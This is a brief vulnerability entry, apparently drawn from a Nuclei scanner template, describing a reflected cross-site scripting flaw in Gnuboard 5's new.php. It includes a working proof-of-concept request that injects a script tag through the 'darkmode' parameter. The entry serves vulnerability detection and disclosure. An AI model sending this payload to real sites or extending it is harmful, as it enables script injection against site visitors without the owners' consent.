# Vulnerability: Gnuboard 5 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`gnuboard5-xss.yaml`)

## Description
Gnuboard 5 contains a cross-site scripting vulnerability via the clean_xss_tags() function called in new.php.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/bbs/new.php?darkmode=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
```

